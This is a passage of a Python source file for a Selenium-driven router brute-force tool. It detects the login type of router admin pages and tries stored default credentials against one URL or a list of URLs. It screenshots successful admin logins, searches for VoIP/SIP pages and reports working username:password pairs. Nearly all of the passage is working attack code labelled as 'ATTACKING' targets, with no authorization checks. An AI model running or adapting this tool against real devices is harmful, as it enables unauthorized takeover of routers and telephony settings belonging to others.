                print(f"{Colors.GREEN}[+] Cookie-based Auth successful! {username}:{password}{Colors.END}")
                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                
                # Search for VoIP/SIP pages after successful login
                voip_screenshots = self.search_voip_after_success(login_url, username, password)
                
                return True, screenshot_path
            
            return False, "Cookie-based Auth failed"
            
        except Exception as e:
            return False, f"Cookie-based Auth error: {e}"
    
    def test_redirect_based_auth(self, username, password, login_url):
        """Test Redirect-Based Authentication"""
        try:
            print(f"{Colors.BLUE}[*] Testing Redirect-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(5)
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass
            
            # Find and fill form fields
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                return False, "Form fields not found"
            
            # Fill credentials
            username_field.clear()
            password_field.clear()
            username_field.send_keys(username)
            password_field.send_keys(password)
            
            # Submit form
            submit_button = self.find_submit_button()
            if submit_button:
                submit_button.click()
            else:
                password_field.send_keys("\n")
            
            time.sleep(5)
            
            # Check for redirects
            current_url = self.driver.current_url
            if current_url != login_url:
                print(f"{Colors.BLUE}[*] Redirect detected: {current_url}{Colors.END}")
                
                # Check if redirected to admin panel
                success, reason = self.is_admin_panel_loaded()
                if success:
                    print(f"{Colors.GREEN}[+] Redirect-based Auth successful! {username}:{password}{Colors.END}")
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                    
                    # Search for VoIP/SIP pages after successful login
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    return True, screenshot_path
            
            return False, "Redirect-based Auth failed"
            
        except Exception as e:
            return False, f"Redirect-based Auth error: {e}"
    
    def test_form_based_auth(self, username, password, login_url):
        """Test Form-Based Authentication (existing method)"""
        try:
            print(f"{Colors.BLUE}[*] Testing Form-based Auth: {username}:{password}{Colors.END}")
            
            # Navigate to login page with intelligent loading
            self.driver.get(login_url)
            
            # Wait for page to load intelligently
            self.wait_for_page_load()
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass
            
            # Find and fill form fields
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                return False, "Form fields not found"
            
            # Fill credentials
            username_field.clear()
            password_field.clear()
            username_field.send_keys(username)
            password_field.send_keys(password)
            
            # Submit form
            submit_button = self.find_submit_button()
            if submit_button:
                submit_button.click()
            else:
                password_field.send_keys("\n")
            
            # Wait for form submission and page response
            self.wait_for_page_load(timeout=8)
            
            # Check for alerts
            alert_text = self.handle_alert()
            if alert_text:
                return False, f"Alert: {alert_text}"
            
            # Check for error pages before checking success
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            # Check for error indicators (but be careful with 401 for HTTP auth)
            error_indicators = [
                'not authorized', 'access denied', 'forbidden', 'unauthorized', 
                'you are not authorized', 'please contact your support', 'try again',
                'http 403', 'http 404', 'http 500'
            ]
            
            # Special handling for 401 in form-based auth
            if 'http 401' in page_source:
                # For form-based auth, 401 usually means login failed
                error_indicators.append('http 401')
            
            if any(error in page_source for error in error_indicators):
                return False, f"Error page detected after login attempt"
            
            # Check if login was successful
            success, reason = self.is_admin_panel_loaded()
            if success:
                print(f"{Colors.GREEN}[+] Form-based Auth successful! {username}:{password}{Colors.END}")
                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                
                # Search for VoIP/SIP pages after successful login
                voip_screenshots = self.search_voip_after_success(login_url, username, password)
                
                return True, screenshot_path
            
            # If page title is empty, wait longer and try again
            if not self.driver.title or self.driver.title.strip() == "":
                print(f"{Colors.YELLOW}[!] Empty page title, waiting longer for page load...{Colors.END}")
                time.sleep(10)  # Wait longer for page to load
                
                # Check again after waiting
                success, reason = self.is_admin_panel_loaded()
                if success:
                    print(f"{Colors.GREEN}[+] Form-based Auth successful after wait! {username}:{password}{Colors.END}")
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                    
                    # Search for VoIP/SIP pages after successful login
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    return True, screenshot_path
            
            # Additional check: if we have admin content but still on login page, it might be successful
            try:
                page_source = self.driver.page_source.lower()
                
                # Check for error pages first (but be careful with 401 for HTTP auth)
                error_indicators = [
                    'not authorized', 'access denied', 'forbidden', 'unauthorized', 
                    'you are not authorized', 'please contact your support', 'try again',
                    'http 403', 'http 404', 'http 500'
                ]
                
                # Special handling for 401 in additional check
                if 'http 401' in page_source:
                    # For form-based auth, 401 usually means login failed
                    error_indicators.append('http 401')
                
                if any(error in page_source for error in error_indicators):
                    return False, f"Error page detected in additional check"
                
                admin_count = sum(1 for indicator in ['admin', 'dashboard', 'system', 'status', 'network', 'settings', 'configuration'] if indicator in page_source)
                login_count = sum(1 for indicator in ['username', 'password', 'login', 'sign in'] if indicator in page_source)
                
                if admin_count >= 3 and login_count <= 2:
                    print(f"{Colors.GREEN}[+] Form-based Auth successful (admin content detected)! {username}:{password}{Colors.END}")
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}", login_url)
                    
                    # Search for VoIP/SIP pages after successful login
                    voip_screenshots = self.search_voip_after_success(login_url, username, password)
                    
                    return True, screenshot_path
            except:
                pass
            
            return False, "Form-based Auth failed"
            
        except Exception as e:
            return False, f"Form-based Auth error: {e}"
    
    def detect_authentication_type(self, login_url):
        """Detect the type of authentication used by the login page"""
        try:
            # Navigate to login page
            self.driver.get(login_url)
            time.sleep(5)
            
            # Clear any existing session data
            try:
                self.driver.delete_all_cookies()
            except:
                pass  # Wait for page to load
            
            # Check for alerts first and handle them
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                print(f"{Colors.YELLOW}[!] Alert detected during page load: {alert_text}{Colors.END}")
                # Don't treat alerts as errors - continue with auth detection
                time.sleep(2)  # Wait a bit after handling alert
            except:
                pass  # No alert present
            
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title
            
            print(f"{Colors.BLUE}[*] Detecting auth type - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {page_title}{Colors.END}")
            
            # Check if page loaded properly
            if not page_title or page_title.strip() == "":
                print(f"{Colors.YELLOW}[!] Page title is empty, trying to refresh...{Colors.END}")
                self.driver.refresh()
                time.sleep(5)
                page_title = self.driver.title
                print(f"{Colors.BLUE}[*] After refresh - Page title: {page_title}{Colors.END}")
            
            # Check for error pages - more comprehensive detection
            error_indicators = [
                'this site can\'t be reached', 'site can\'t be reached', 'connection refused', 
                'timeout', 'error', 'not found', 'unavailable', 'server not found',
                'dns_probe_finished_nxdomain', 'err_name_not_resolved', 'err_connection_refused',
                'err_connection_timed_out', 'err_connection_reset', 'err_network_changed',
                'err_internet_disconnected', 'err_connection_failed', 'err_timed_out',
                'net::err_name_not_resolved', 'net::err_connection_refused', 'net::err_connection_timed_out'
            ]
            
            # Error detection moved below to be more lenient
            
            # Check for specific error patterns in title (be VERY lenient)
            if page_title and any(error in page_title.lower() for error in ['this site can\'t be reached', 'connection refused', 'dns_probe_finished_nxdomain']):
                return "error", f"Error page detected in title: {page_title}"
            
            # Check for empty or generic titles that might indicate errors
            # Be VERY lenient - only flag as error if we're absolutely sure it's an error page
            if not page_title or page_title.strip() == "":
                # For empty titles, be VERY lenient - try authentication detection first
                print(f"{Colors.BLUE}[*] Empty title, trying authentication detection...{Colors.END}")
                # Don't return error immediately - let authentication detection handle it
            elif page_title in ['211.27.181.3', 'NetComm', 'NetComm Wireless Limited', 'Netcomm']:
                # These are valid router pages, don't treat as error
                print(f"{Colors.BLUE}[*] Valid router title '{page_title}', continuing with authentication detection...{Colors.END}")
            else:
                # For any other title, be lenient and continue
                print(f"{Colors.BLUE}[*] Title '{page_title}', continuing with authentication detection...{Colors.END}")
                
            # Check page source for error indicators only if we're sure it's an error
            error_indicators = [
                'this site can\'t be reached', 'site can\'t be reached', 'connection refused', 
                'timeout', 'dns_probe_finished_nxdomain', 'err_name_not_resolved', 'err_connection_refused',
                'err_connection_timed_out', 'err_connection_reset', 'err_network_changed',
                'err_internet_disconnected', 'err_connection_failed', 'err_timed_out',
                'net::err_name_not_resolved', 'net::err_connection_refused', 'net::err_connection_timed_out'
            ]
            
            # Be more lenient with error detection
            if any(error in page_source for error in ['this site can\'t be reached', 'connection refused', 'dns_probe_finished_nxdomain']):
                return "error", "Error page detected in content"
            
            # 🔍 **1. Check for Form-Based Authentication FIRST (most common)**
            form_indicators = ['username', 'password', 'login', 'sign in', 'authentication', 'enter credentials', 'user login', 'admin login', 'router login']
            form_count = sum(1 for indicator in form_indicators if indicator in page_source)
            
            # Check for input fields
            try:
                username_inputs = self.driver.find_elements("css selector", "input[type='text'], input[type='email'], input[name*='user'], input[name*='login'], input[id*='user'], input[id*='login']")
                password_inputs = self.driver.find_elements("css selector", "input[type='password']")
                
                if len(username_inputs) > 0 and len(password_inputs) > 0:
                    print(f"{Colors.GREEN}[+] Form-based authentication detected{Colors.END}")
                    return "form", "Form-based authentication with login fields"
                elif len(password_inputs) > 0:  # If we have password field, it's likely a form
                    print(f"{Colors.GREEN}[+] Form-based authentication detected (password field found){Colors.END}")
                    return "form", "Form-based authentication detected (password field)"
                elif form_count >= 2:
                    print(f"{Colors.GREEN}[+] Form-based authentication detected (by content){Colors.END}")
                    return "form", "Form-based authentication detected by content"
                    
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error detecting form fields: {e}{Colors.END}")
            
            # 🔍 **2. Check for API-Based Authentication**
            api_indicators = ['api', 'json', 'rest', 'ajax', 'xhr', 'fetch', 'axios', 'endpoint', 'service']
            api_count = sum(1 for indicator in api_indicators if indicator in page_source)
            if api_count >= 2:
                print(f"{Colors.GREEN}[+] API-based authentication detected{Colors.END}")
                return "api", "API-based authentication detected"
            
            # 🔍 **3. Check for JavaScript-Based Authentication**
            js_indicators = ['javascript', 'js', 'onclick', 'onload', 'onchange', 'onsubmit', 'addEventListener', 'jquery', 'angular', 'react', 'vue']
            js_count = sum(1 for indicator in js_indicators if indicator in page_source)
            if js_count >= 3:
                print(f"{Colors.GREEN}[+] JavaScript-based authentication detected{Colors.END}")
                return "javascript", "JavaScript-based authentication detected"
            
            # 🔍 **4. Check for Cookie-Based Authentication**
            cookie_indicators = ['cookie', 'session', 'token', 'csrf', 'csrf_token', 'authenticity_token', 'sessionid', 'jsessionid']
            cookie_count = sum(1 for indicator in cookie_indicators if indicator in page_source)
            if cookie_count >= 2:
                print(f"{Colors.GREEN}[+] Cookie-based authentication detected{Colors.END}")
                return "cookie", "Cookie-based authentication detected"
            
            # 🔍 **5. Check for Redirect-Based Authentication**
            redirect_indicators = ['redirect', 'location', 'window.location', 'href', 'url', 'goto', 'forward']
            redirect_count = sum(1 for indicator in redirect_indicators if indicator in page_source)
            if redirect_count >= 2:
                print(f"{Colors.GREEN}[+] Redirect-based authentication detected{Colors.END}")
                return "redirect", "Redirect-based authentication detected"
            
            
            # 🔍 **6. Check for HTTP Basic/Digest Authentication**
            # Try to access the page and check response headers
            try:
                import requests
                response = requests.get(login_url, timeout=10, allow_redirects=False)
                
                # Check for HTTP Basic Auth
                if response.status_code == 401 and 'www-authenticate' in response.headers:
                    auth_header = response.headers['www-authenticate'].lower()
                    if 'basic' in auth_header:
                        print(f"{Colors.GREEN}[+] HTTP Basic authentication detected{Colors.END}")
                        return "basic", "HTTP Basic authentication detected"
                    elif 'digest' in auth_header:
                        print(f"{Colors.GREEN}[+] HTTP Digest authentication detected{Colors.END}")
                        return "digest", "HTTP Digest authentication detected"
                elif response.status_code == 200:
                    # Even if not 401, some routers might support basic auth
                    print(f"{Colors.GREEN}[+] HTTP Basic Auth possible (status 200){Colors.END}")
                    return "basic", "Trying HTTP Basic Auth (status 200)"
                else:
                    # Try basic auth anyway for any status code
                    print(f"{Colors.GREEN}[+] Trying HTTP Basic Auth (status {response.status_code}){Colors.END}")
                    return "basic", f"Trying HTTP Basic Auth (status {response.status_code})"
                        
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error checking HTTP auth headers: {e}{Colors.END}")
                # If we can't check headers, still try basic auth as fallback
                print(f"{Colors.BLUE}[*] Cannot check headers, trying HTTP Basic Auth as fallback{Colors.END}")
                return "basic", "HTTP Basic Auth fallback"
            
            # 🔍 **7. Default fallback - try multiple methods**
            print(f"{Colors.BLUE}[*] No specific auth type detected, trying multiple methods...{Colors.END}")
            
            # Try form-based first if we have any input fields
            try:
                all_inputs = self.driver.find_elements("css selector", "input")
                if len(all_inputs) > 0:
                    print(f"{Colors.GREEN}[+] Found {len(all_inputs)} input fields, trying form-based auth{Colors.END}")
                    return "form", "Form-based authentication (fallback detection)"
            except:
                pass
            
            # Try basic auth as final fallback
            print(f"{Colors.GREEN}[+] Trying HTTP Basic Auth as final fallback{Colors.END}")
            return "basic", "HTTP Basic Auth (final fallback)"
                
        except Exception as e:
            return "error", f"Error detecting auth type: {e}"
    
    def test_credentials(self, username, password, login_url):
        """Test a single set of credentials"""
        try:
            print(f"{Colors.CYAN}[>] Testing credentials: {username}:{password}{Colors.END}")
            
            # First, detect authentication type
            auth_type, auth_reason = self.detect_authentication_type(login_url)
            print(f"{Colors.BLUE}[*] Authentication type: {auth_type} - {auth_reason}{Colors.END}")
            
            if auth_type == "error":
                return False, f"Page load error: {auth_reason}"
            
            # Route to appropriate authentication method
            if auth_type == "basic":
                return self.test_http_basic_auth(username, password, login_url)
            elif auth_type == "digest":
                return self.test_http_digest_auth(username, password, login_url)
            elif auth_type == "api":
                return self.test_api_based_auth(username, password, login_url)
            elif auth_type == "javascript":
                return self.test_javascript_based_auth(username, password, login_url)
            elif auth_type == "cookie":
                return self.test_cookie_based_auth(username, password, login_url)
            elif auth_type == "redirect":
                return self.test_redirect_based_auth(username, password, login_url)
            elif auth_type == "form":
                return self.test_form_based_auth(username, password, login_url)
            else:
                # Default fallback - try multiple methods
                print(f"{Colors.YELLOW}[!] Unknown auth type, trying multiple methods{Colors.END}")
                
                # Try HTTP Basic Auth first
                basic_success, basic_result = self.test_http_basic_auth(username, password, login_url)
                if basic_success:
                    return True, basic_result
                
                # Try Form-based Auth
                form_success, form_result = self.test_form_based_auth(username, password, login_url)
                if form_success:
                    return True, form_result
                
                return False, "All authentication methods failed"
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing credentials {username}:{password}: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def brute_force_single_url(self, login_url):
        """Perform brute force attack on a single URL"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] ATTACKING: {login_url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Navigate to URL
            self.driver.get(login_url)
            time.sleep(2)
            
            successful_credentials = []
            
            # Test each credential set
            for i, (username, password) in enumerate(TARGET_CREDENTIALS, 1):
                if not running:
                    break
                
                print(f"\n{Colors.YELLOW}[{i}/{len(TARGET_CREDENTIALS)}] Testing credential set {i}{Colors.END}")
                
                success, result = self.test_credentials(username, password, login_url)
                
                if success:
                    print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                    
                    # Add to vulnerable findings
                    screenshot_path = result if isinstance(result, str) and result.endswith('.png') else None
                    auth_type = "unknown"  # We'll improve this later
                    
                    # Try to detect auth type from the successful login
                    try:
                        auth_type, _ = self.detect_authentication_type(login_url)
                    except:
                        pass
                    # Extract device info if available
                    device_info = None
                    try:
                        device_info = self.extract_device_info()
                    except:
                        pass
                    
                    self.add_vulnerable_finding(login_url, username, password, auth_type, screenshot_path, device_info)
                    
                    successful_credentials.append({
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'screenshot': screenshot_path
                    })
                    
                    with self.lock:
                        stats['successful_logins'] += 1
                        if result and result.endswith('.png'):
                            stats['screenshots_taken'] += 1
                    
                    # Stop testing other credentials once we find a working one
                    print(f"{Colors.YELLOW}[*] Found working credentials - stopping further tests for this URL{Colors.END}")
                    break
                else:
                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                
                # Update progress
                with self.lock:
                    stats['targets_scanned'] += 1
            
            return successful_credentials
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error attacking {login_url}: {e}{Colors.END}")
            return []
    
    def brute_force_attack(self):
        """Perform brute force attack on all URLs"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
            print(f"{Colors.CYAN}[*] Total URLs to test: {len(self.login_urls)}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Setup Chrome driver
            if not self.setup_chrome_driver():
                return False
            
            all_successful_credentials = []
            
            # Test each URL
            for i, login_url in enumerate(self.login_urls, 1):
                if not running:
                    break
                
                print(f"\n{Colors.MAGENTA}[URL {i}/{len(self.login_urls)}] Processing: {login_url}{Colors.END}")
                
                successful_credentials = self.brute_force_single_url(login_url)
                all_successful_credentials.extend(successful_credentials)
                
                # Update progress
                print(f"{Colors.BLUE}[*] Progress: {i}/{len(self.login_urls)} URLs processed{Colors.END}")
            
            # Close browser
            if self.driver:
                self.driver.quit()
            
            # Report results
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] BRUTE FORCE ATTACK COMPLETED{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            
            if all_successful_credentials:
                print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND:{Colors.END}")
                for cred in all_successful_credentials:
                    print(f"  • {Colors.WHITE}{cred['url']}{Colors.END} -> {Colors.RED}{cred['username']}:{cred['password']}{Colors.END}")
                    if cred['screenshot']:
                        print(f"    Screenshot: {Colors.CYAN}{cred['screenshot']}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] No vulnerable routers found - all routers appear secure{Colors.END}")
            
            return len(all_successful_credentials) > 0
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error during brute force attack: {e}{Colors.END}")
            if self.driver:
                self.driver.quit()
            return False

def parse_login_urls(url_input):
    """Parse and validate login URLs from input (single URL or file)"""
    urls = []
    
    # Check if input is a file
    if url_input.endswith('.txt') and os.path.exists(url_input):
        try:
            with open(url_input, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):  # Skip empty lines and comments
                        # Add http:// if no scheme provided
                        if not line.startswith(('http://', 'https://')):
                            line = 'http://' + line
                        urls.append(line)
            print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs from file: {url_input}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading file {url_input}: {e}{Colors.END}")
            return []
    else:
        # Single URL
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'http://' + url_input
        urls.append(url_input)
    
    # Validate URLs
    valid_urls = []
    for url in urls:
        try:
            parsed = urlparse(url)
            # Check if hostname is valid (contains at least one dot or is localhost)
            if parsed.hostname and ('.' in parsed.hostname or parsed.hostname == 'localhost'):
                valid_urls.append(url)
            else:
                print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
        except:
            print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
    
    return valid_urls

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Login Brute Force Tool")
    parser.add_argument('-u', '--url', required=True, help='Login URL to test (single URL or .txt file with URLs)')
    parser.add_argument('--timeout', type=int, default=10, help='Page load timeout in seconds (default: 10)')
    parser.add_argument('--headless', action='store_true', help='Run Chrome in headless mode (default: visible)')
    parser.add_argument('--screenshot-dir', default='screenshots', help='Directory to save screenshots (default: screenshots)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    # Parse URLs (single URL or file)
    login_urls = parse_login_urls(args.url)
    if not login_urls:
        print(f"{Colors.RED}[!] No valid URLs found in: {args.url}{Colors.END}")
        return
    
    # Check if Selenium is available
    if not SELENIUM_AVAILABLE:
        print(f"{Colors.RED}[!] Selenium is not available. Please install: pip install selenium{Colors.END}")
        return
    
    # Startup info
    if len(login_urls) == 1:
        print(f"{Colors.GREEN}[+] Target URL: {login_urls[0]}{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Target URLs: {len(login_urls)} URLs loaded{Colors.END}")
        for i, url in enumerate(login_urls[:5], 1):  # Show first 5 URLs
            print(f"  {i}. {url}")
        if len(login_urls) > 5:
            print(f"  ... and {len(login_urls) - 5} more URLs")
    
    creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS])
    print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with visible browser{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Workflow: Open Chrome → Navigate → Test Credentials → Screenshot{Colors.END}")
    
    if args.headless:
        print(f"{Colors.YELLOW}[!] Running in headless mode{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Chrome will be visible during attack{Colors.END}")
    
    # Initialize brute force tool
    brute_force = ChromeRouterBruteForce(
        login_urls=login_urls,
        timeout=args.timeout,
        headless=args.headless,
        screenshot_dir=args.screenshot_dir
    )
    
    stats['start_time'] = time.time()
    
    try:
        # Start brute force attack
        success = brute_force.brute_force_attack()
        
        # Final statistics
        total_time = time.time() - stats['start_time']
        
        print(f"\n{Colors.CYAN}[*] FINAL STATISTICS:{Colors.END}")
        print(f"  - Total URLs tested: {Colors.CYAN}{len(login_urls)}{Colors.END}")
        print(f"  - Total credentials tested: {Colors.CYAN}{stats['targets_scanned']}{Colors.END}")
        print(f"  - Successful logins: {Colors.RED}{stats['successful_logins']}{Colors.END}")
        print(f"  - Screenshots taken: {Colors.BLUE}{stats['screenshots_taken']}{Colors.END}")
        print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
        print(f"  - Screenshots saved in: {Colors.YELLOW}{args.screenshot_dir}{Colors.END}")
        
        if success:
            print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND - Change default credentials immediately!{Colors.END}")
            # Generate report
            report_path = brute_force.generate_report()
            if report_path:
                print(f"{Colors.GREEN}[+] Detailed report saved: {report_path}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] All routers appear secure - no default credentials found{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during attack: {e}{Colors.END}")

if __name__ == "__main__":
    main()